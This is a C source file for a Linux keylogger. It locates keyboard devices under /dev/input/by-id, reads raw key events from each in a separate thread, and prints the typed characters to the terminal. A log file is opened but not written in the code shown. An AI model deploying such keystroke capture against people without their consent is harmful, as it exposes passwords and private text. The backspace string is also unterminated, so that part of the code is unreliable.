#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>

#include <linux/input.h>
#include <linux/input-event-codes.h>

#include <kbdEvents.h>




#define LOG_FILE "log.txt"
static FILE *log;

static char input_devices[MAX_INPUT_DEVICES][MAX_FILE_PATH];       //holds keyboard devices on this system
static int dev_fd[MAX_INPUT_DEVICES];//array of devive file descriptors
pthread_mutex_t lock;

static pthread_t dev_threads[MAX_INPUT_DEVICES]; //thread data for each device
static int dev_n = 0;      //represents number of keyboard devices found

static char *keys[KEY_MAX];






void check(int test, const char* desc){
    if(-1 == test){
        fprintf(stderr, "error: %s\nerrno:%s\n", desc, strerror(errno));
        exit(1);
    }
    return;
}
void check2(void* test, const char* desc){
    if(NULL == test){
        fprintf(stderr, "error: %s\nerrno:%s\n", desc, strerror(errno));
        exit(1);
    }
    return;
}


void logger_init(){
    log  = fopen(LOG_FILE, "a");
    check2(log, "log file failed to open");


    check(pthread_mutex_init(&lock, NULL), "mutex lock failed to init");


    keys[KEY_1] = "1";
    keys[KEY_2] = "2";
    keys[KEY_3] = "3";
    keys[KEY_4] = "4";
    keys[KEY_5] = "5";
    keys[KEY_6] = "6";
    keys[KEY_7] = "7";
    keys[KEY_8] = "8";
    keys[KEY_9] = "9";
    keys[KEY_0] = "0";
    keys[KEY_MINUS] = "-";
    keys[KEY_EQUAL] = "=";
    keys[KEY_BACKSPACE] = malloc(1);
    *keys[KEY_BACKSPACE] = (char)8;
    keys[KEY_TAB] = "\t";
    keys[KEY_Q] = "q";
    keys[KEY_W] = "w";
    keys[KEY_E] = "e";
    keys[KEY_R] = "r";
    keys[KEY_T] = "t";
    keys[KEY_Y] = "y";
    keys[KEY_U] = "u";
    keys[KEY_I] = "i";
    keys[KEY_O] = "o";
    keys[KEY_P] = "p";
    keys[KEY_LEFTBRACE] = "[";
    keys[KEY_RIGHTBRACE] = "]";
    keys[KEY_ENTER] = "\n";
    keys[KEY_A] = "a";
    keys[KEY_S] = "s";
    keys[KEY_D] = "d";
    keys[KEY_F] = "f";
    keys[KEY_G] = "g";
    keys[KEY_H] = "h";
    keys[KEY_J] = "j";
    keys[KEY_K] = "k";
    keys[KEY_L] = "l";
    keys[KEY_SEMICOLON] = ";";
    keys[KEY_APOSTROPHE] = "'";
    keys[KEY_GRAVE] = "`";
    keys[KEY_BACKSLASH] = "\\";
    keys[KEY_Z] = "z";
    keys[KEY_X] = "x";
    keys[KEY_C] = "c";
    keys[KEY_V] = "v";
    keys[KEY_B] = "b";
    keys[KEY_N] = "n";
    keys[KEY_M] = "m";
    keys[KEY_COMMA] = ",";
    keys[KEY_DOT] = ".";
    keys[KEY_SLASH] = "/";
    keys[KEY_SPACE] = " ";
}




void find_keyboards(){
   FILE *dev_pipe = popen("find \"/dev/input/by-id\" -iname \"*-kbd\"", "r");
   check2(dev_pipe, "failed to find input device files");

   while(dev_n < MAX_INPUT_DEVICES
   && fgets(input_devices[dev_n], sizeof input_devices[dev_n], dev_pipe)){
       //replace terminating char with \0 instead of \n
       int last_char = strcspn(input_devices[dev_n], "\n");
       input_devices[dev_n][last_char] = '\0';
       dev_n++;
   }   
}





void open_keyboards(){
    for(int i = 0; i < dev_n; i++){
        dev_fd[i] = open(input_devices[i], O_RDONLY);
        check(dev_fd[i], "failed to open device file");
    }
}





//arg will be fd for an open event file
static void *read_input(void* arg){
    int *fd = (int *)arg;
    struct input_event event;
    ssize_t n;
    while (1){
        n = read(*fd, &event, sizeof(event));
        check((int)n, "failed to read input event from device file");
        
        if (n != sizeof(event)){
            continue;
        }
        else{
            if(EV_KEY == event.type && 0 < event.value){
                if(keys[event.code]){
                    printf("%s", keys[event.code]);
                    fflush(stdout);
                }
            }
        }
    }
}





void read_keyboards(){
    for(int i = 0; i < dev_n; i++){
        pthread_create(&(dev_threads[i]), NULL, read_input, &(dev_fd[i]));  
    }
}

